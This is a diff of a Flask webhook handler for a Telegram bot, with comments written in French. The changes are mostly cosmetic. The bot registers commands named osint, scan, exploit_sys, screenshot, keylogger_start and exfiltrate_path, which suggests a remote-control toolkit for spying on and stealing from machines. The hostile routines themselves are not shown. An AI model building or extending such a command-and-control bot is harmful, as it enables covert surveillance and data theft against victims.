@@ -1,16 +1,16 @@
+# telegram/webhook.py
+
 import os
 import traceback
 import asyncio
 from flask import Blueprint, request, Response
 from telegram import Update
-from telegram.ext import (
-    ApplicationBuilder, CommandHandler
-)
+from telegram.ext import ApplicationBuilder, CommandHandler
 
 # ✅ Import clés depuis utils
 from modules.utils import get_api_keys
 
-# ✅ Commandes Telegram
+# ✅ Commandes Telegram importées du module
 from telegram_bot.telegram_bot import (
     menu, osint, scan, exploit_sys,
     screenshot, keylogger_start,
@@ -18,27 +18,29 @@ from telegram_bot.telegram_bot import (
     rapport
 )
 
-# ✅ Récupération des clés API
+# 🔐 Chargement des clés
 api = get_api_keys()
 TOKEN = api.get("TELEGRAM_BOT_TOKEN")
 SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")
 
-# ✅ Blueprint Flask
+# ✅ Définition du webhook Flask
 telegram_webhook = Blueprint("telegram_webhook", __name__)
 
-@telegram_webhook.route("/webhook", methods=["POST"])
+@telegram_webhook.route("/telegram/webhook", methods=["POST"])
 def handle_webhook():
     try:
+        # 🔐 Vérification du secret Telegram
         if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET_TOKEN:
+            print("❌ Requête rejetée : mauvais token secret.")
             return Response("Unauthorized", status=403)
 
         update_data = request.get_json(force=True)
         update = Update.de_json(update_data, bot=None)
 
-        # 🔁 Nouvelle instance isolée à chaque appel (anti-loop-close bug)
+        # 🔁 Nouvelle instance Application (anti boucle fermée)
         app = ApplicationBuilder().token(TOKEN).build()
 
-        # ➕ Ajout des handlers
+        # ➕ Enregistrement des commandes supportées
         app.add_handler(CommandHandler("menu", menu))
         app.add_handler(CommandHandler("osint", osint))
         app.add_handler(CommandHandler("scan", scan))
@@ -50,11 +52,12 @@ def handle_webhook():
         app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
         app.add_handler(CommandHandler("rapport", rapport))
 
-        # 🧠 Gestion propre de l’event loop
+        # 🧠 Traitement asynchrone
         async def process():
             await app.initialize()
             await app.process_update(update)
 
+        # 🎯 Event loop propre pour Render
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         loop.run_until_complete(process())
@@ -64,6 +67,6 @@ def handle_webhook():
         return Response("OK", status=200)
 
     except Exception as e:
-        print("❌ Erreur webhook :", str(e))
+        print(f"❌ Erreur webhook : {e}")
         traceback.print_exc()
         return Response("Erreur serveur", status=500)
